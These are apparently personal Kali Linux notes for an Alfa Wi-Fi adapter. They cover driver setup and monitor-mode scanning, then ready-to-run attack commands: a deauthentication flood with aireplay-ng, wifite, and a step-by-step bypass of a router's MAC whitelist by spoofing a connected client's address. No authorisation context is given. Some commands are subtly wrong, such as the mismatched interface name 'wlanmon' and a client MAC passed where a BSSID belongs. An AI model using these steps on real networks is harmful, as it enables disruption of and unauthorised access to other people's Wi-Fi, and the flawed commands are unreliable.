# WIFI Alfa AWUS036ACH
#Kali #Linux 

## Install driver
1. Connect the Wireless device to the Kali linux host.
2. Update package lists
```bash
sudo apt update
```
3. Install driver
```bash
sudo apt install realtek-rtl88xxau-dkms
```
4. Reboot the host

## Set the wireless adapter in Monitor Mode
```bash
sudo airmon-ng check kill
```

```bash
sudo airmon-ng start wlan0
```


## Check if it works
```bash
iw dev
```

```bash
ifconfig
```

```bash
iwconfig
```

## Set wireless adapter back in managed mode
```bash
sudo airmon-ng stop wlanmon
```

```bash
sudo systemctl start wpa_supplicant
```

```bash
sudo systemctl start NetworkManager
```

## Scan

```bash
sudo airodump-ng wlan0mon 
```
By default it will scan only in 2.4Ghz

```bash
airodump-ng wlan0mon --manufacturer
```
Gives you a bit more information

```bash
airodump-ng wlan0mon --manufacturer --band abg
```
Scan in different bands

## Attacks

### reconnaissance
```bash
sudo airodump-ng --bssid <bssid> --channel <CH-number> wlan0mon
```

### De-auth attack
```bash
sudo aireplay-ng -0 30 -a <client-mac-address> wlan0mon
```

### Wifite
```bash
sudo wifite
```

### Bypass router mac-address whitelist
1. Run the following command:
```bash
sudo airodump-ng --bssid <bssid> --band bg wlan0mon
```

2. Wait for a client to connect. When a client connects, its mac address appears. Grab the client's mac address. You will manually change your adapter's mac address with this mac address as follows:
```bash
sudo airmon-ng stop wlanmon

sudo systemctl start wpa_supplicant

sudo systemctl stop NetworkManager

sudo ip link set dev wlan0 down

sudo ip link set dev wlan0 address <whitelisted-mac-address>

sudo ip link set dev wlan0 up

sudo systemctl start NetworkManager
```
